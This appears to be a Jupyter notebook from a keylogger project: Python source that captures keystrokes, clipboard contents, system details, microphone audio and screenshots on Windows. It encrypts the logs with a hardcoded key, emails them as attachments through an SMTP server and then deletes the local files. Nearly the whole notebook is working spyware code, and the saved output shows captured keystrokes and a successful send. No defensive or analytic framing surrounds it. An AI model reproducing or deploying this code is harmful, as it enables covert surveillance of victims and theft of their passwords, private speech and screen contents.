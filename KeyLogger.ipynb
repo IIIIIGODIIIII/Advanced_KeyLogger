{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Imports"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 12,
   "metadata": {},
   "outputs": [],
   "source": [
    "# For E-Mail Features\n",
    "import smtplib\n",
    "from email.mime.multipart import MIMEMultipart\n",
    "from email.mime.text import MIMEText\n",
    "from email.mime.base import MIMEBase\n",
    "from email import encoders\n",
    "\n",
    "# For collecting System Information\n",
    "import socket\n",
    "import platform\n",
    "\n",
    "# For collecting clipboard information\n",
    "import win32clipboard\n",
    "\n",
    "# For recording keystrokes\n",
    "from pynput.keyboard import Key, Listener       # Key logs the key and Listener listens for each key type\n",
    "\n",
    "import time\n",
    "import os\n",
    "\n",
    "# For accessing sound modules\n",
    "from scipy.io.wavfile import write\n",
    "import sounddevice as sd\n",
    "\n",
    "# For encrypting the file\n",
    "from cryptography.fernet import Fernet\n",
    "\n",
    "# For getting some more computer information\n",
    "import getpass                                  # To get password\n",
    "from requests import get\n",
    "\n",
    "# For taking screenshots\n",
    "from multiprocessing import Process, freeze_support\n",
    "from PIL import ImageGrab"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### KeyLogger"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "##### Global Variables"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 13,
   "metadata": {},
   "outputs": [],
   "source": [
    "keys_information = \"Key_Logs.txt\"               # All keys logged will be appended here \n",
    "\n",
    "# For e-mail features\n",
    "from_email = ''                                             # Sender email address\n",
    "password = ''                                               # Sender email password\n",
    "to_email = ''                                               # Recipient's email address\n",
    "\n",
    "HOST = \"smtp-mail.outlook.com\"\n",
    "PORT = 587\n",
    "\n",
    "# For system information\n",
    "system_information = \"System_Info.txt\"\n",
    "\n",
    "# For clipboard information\n",
    "clipboard_information = \"Clipboard.txt\"\n",
    "\n",
    "# For microphone information \n",
    "microphone_time = 5\n",
    "audio_information = \"Audio_Information.wav\"\n",
    "\n",
    "# For screenshot information\n",
    "screenshots_information = \"Screenshot.png\"\n",
    "\n",
    "# For encryption of files\n",
    "key = \"VgwNiPId1ddoJ9PkkYxzXjHKpsWoV-7fCGoffzdskwI=\"\n",
    "key_information = \"E_Key_Logs.txt\"\n",
    "key_system_information = \"E_System_Info.txt\"\n",
    "key_clipboard_information = \"E_Clipboard.txt\"\n",
    "\n",
    "\n",
    "file_path = \"E:\\\\Computer Science\\\\Python\\\\Projects\\\\Advanced KeyLogger\"\n",
    "extend = \"\\\\\"\n",
    "file_merge = file_path + extend\n",
    "\n",
    "count = 0\n",
    "keys = []                                     # Each key will be appended here"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Functions"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "##### KeyLogger Functions"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 14,
   "metadata": {},
   "outputs": [],
   "source": [
    "# Appends keystrokes into keys list\n",
    "def on_press(key):\n",
    "    global keys, count\n",
    "\n",
    "    print(key)\n",
    "    keys.append(key)\n",
    "    count += 1\n",
    "    \n",
    "\n",
    "    if count >= 1:\n",
    "        count = 0\n",
    "        write_file(keys)\n",
    "        keys =[]\n",
    "\n",
    "# Write the values of list keys into log file\n",
    "def write_file(keys):\n",
    "    with open(file_path + extend + keys_information, \"a\") as f:         # a stands for append and f is the file object\n",
    "\n",
    "        # For making the file look more readable\n",
    "        for key in keys:\n",
    "            k = str(key).replace(\"'\", \"\")                               # Converting key into string and then removing ' with nothing\n",
    "            if k.find(\"space\") > 0:                                     # Whenever we encounter a space we will move to next line\n",
    "                f.write('\\n')\n",
    "                f.close()\n",
    "\n",
    "            elif k.find(\"Key\") == -1:                                   # If the key is not a special key then we will write it \n",
    "                f.write(k)\n",
    "                f.close()\n",
    "\n",
    "# To exit out from the keylogger\n",
    "def on_release(key):\n",
    "    if key == Key.esc:\n",
    "        return False"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "##### E-mail Functionality"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 15,
   "metadata": {},
   "outputs": [],
   "source": [
    "def send_email_with_attachment(from_email, password, to_email, subject, body, file_paths):\n",
    "    # Create a multipart message\n",
    "    msg = MIMEMultipart()\n",
    "    msg['From'] = from_email\n",
    "    msg['To'] = to_email\n",
    "    msg['Subject'] = subject\n",
    "\n",
    "    # Add body to email\n",
    "    msg.attach(MIMEText(body, 'plain'))\n",
    "\n",
    "    # Attach files to the email\n",
    "    for file_path in file_paths:\n",
    "        attachment = open(file_path, 'rb')\n",
    "\n",
    "        part = MIMEBase('application', 'octet-stream')\n",
    "        part.set_payload(attachment.read())\n",
    "        encoders.encode_base64(part)\n",
    "        part.add_header('Content-Disposition', f'attachment; filename= {file_path}')\n",
    "        \n",
    "        msg.attach(part)\n",
    "\n",
    "    # Connect to the SMTP server and send the email\n",
    "    try:\n",
    "        smtp = smtplib.SMTP('smtp-mail.outlook.com', 587)                                                                  # Update SMTP server and port if using a different provider\n",
    "        smtp.starttls()\n",
    "        smtp.login(from_email, password)\n",
    "        text = msg.as_string()\n",
    "        smtp.sendmail(from_email, to_email, text)\n",
    "        smtp.quit()\n",
    "        print(\"Email sent successfully.\")\n",
    "\n",
    "    except Exception as e:\n",
    "        print(\"Failed to send email:\", e)\n",
    "\n",
    "# Example usage\n",
    "subject = 'KeyLogger Output'\n",
    "body = 'Captured Files Attached.'\n",
    "#file_paths = ['Key_Logs.txt','Clipboard.txt','Screenshot.png','System_Info.txt','Audio_Information.wav']                  # Update with paths to the files you want to attach\n",
    "\n",
    "#send_email_with_attachment(from_email, password, to_email, subject, body, file_paths)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "##### System Information"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 23,
   "metadata": {},
   "outputs": [],
   "source": [
    "def computer_information():\n",
    "    with open(file_path + extend + system_information, \"a\") as f:\n",
    "        hostname = socket.gethostname()\n",
    "        IPAddr = socket.gethostbyname(hostname)\n",
    "        try:\n",
    "            public_ip = get(\"https://api.ipify.org\").text\n",
    "            f.write(\"\\nPublic IP Address: \" + public_ip + '\\n')\n",
    "\n",
    "        except Exception:\n",
    "            f.write(\"Couldn't get Public IP Address (most likely max query\" + '\\n')\n",
    "\n",
    "        f.write(\"Processor: \" + (platform.processor()) + '\\n')\n",
    "        f.write(\"System: \" + platform.system() + \" \" + platform.version() + '\\n')\n",
    "        f.write(\"Machine: \" + platform.machine() + \"\\n\")\n",
    "        f.write(\"Hostname: \" + hostname + \"\\n\")\n",
    "        f.write(\"Private IP Address: \" + IPAddr + \"\\n\")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "##### Clipboard Information"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 17,
   "metadata": {},
   "outputs": [],
   "source": [
    "def copy_clipboard():\n",
    "    with open(file_path + extend + clipboard_information, \"a\") as f:\n",
    "        try:\n",
    "            win32clipboard.OpenClipboard()\n",
    "            data = win32clipboard.GetClipboardData()\n",
    "            win32clipboard.CloseClipboard()\n",
    "\n",
    "            f.write(\"Clipboard Data: \\n\" + data)\n",
    "\n",
    "        except:\n",
    "            f.write(\"Clipboard could not be copied \\n\")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "##### Microphone Information"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 18,
   "metadata": {},
   "outputs": [],
   "source": [
    "def microphone():\n",
    "    sampling_frequency = 48000 \n",
    "    seconds = microphone_time    # For how much time do we wanna record the audio\n",
    "\n",
    "    recording = sd.rec(int(sampling_frequency * seconds), samplerate = sampling_frequency, channels = 2)\n",
    "    sd.wait()\n",
    "\n",
    "    write(file_path + extend + audio_information, sampling_frequency, recording)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "##### Screenshot Functionality"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 19,
   "metadata": {},
   "outputs": [],
   "source": [
    "def screenshot():\n",
    "    im = ImageGrab.grab()\n",
    "    im.save(file_path + extend + screenshots_information)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "##### KeyLogger "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 24,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Key.enter\n",
      "'n'\n",
      "'a'\n",
      "'n'\n",
      "'a'\n",
      "Key.space\n",
      "'h'\n",
      "'u'\n",
      "'h'\n",
      "'u'\n",
      "Key.space\n",
      "'j'\n",
      "'i'\n",
      "'j'\n",
      "'i'\n",
      "Key.esc\n"
     ]
    }
   ],
   "source": [
    "count = 0\n",
    "keys =[]\n",
    "\n",
    "# For listening to keys and to imlement all the functions together\n",
    "with Listener(on_press=on_press, on_release=on_release) as listener:\n",
    "    listener.join()\n",
    "\n",
    "# Keystrokes are now being captured\n",
    "computer_information()\n",
    "copy_clipboard()\n",
    "microphone()\n",
    "screenshot()    \n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "##### Encryption Functionality"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 21,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Email sent successfully.\n"
     ]
    }
   ],
   "source": [
    "files_to_encrypt = [file_merge + keys_information, file_merge + system_information, file_merge + clipboard_information]\n",
    "encrypted_file_names = [file_merge + key_information, file_merge + key_system_information, file_merge + key_clipboard_information]\n",
    "\n",
    "count = 0\n",
    "\n",
    "for encrypting_file in files_to_encrypt:\n",
    "\n",
    "    with open(files_to_encrypt[count], 'rb') as f:\n",
    "        data = f.read()\n",
    "\n",
    "    fernet = Fernet(key)\n",
    "    encrypted = fernet.encrypt(data)\n",
    "\n",
    "    with open(encrypted_file_names[count], 'wb') as f:\n",
    "        f.write(encrypted)\n",
    "\n",
    "    count += 1\n",
    "\n",
    "send_email_with_attachment(from_email, password, to_email, subject, body, encrypted_file_names + [screenshots_information, audio_information])"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "##### Cleaning up "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 25,
   "metadata": {},
   "outputs": [],
   "source": [
    "delete_files = [system_information, clipboard_information, keys_information]\n",
    "for file in delete_files:\n",
    "    os.remove(file_merge + file)"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "env",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.9.0"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
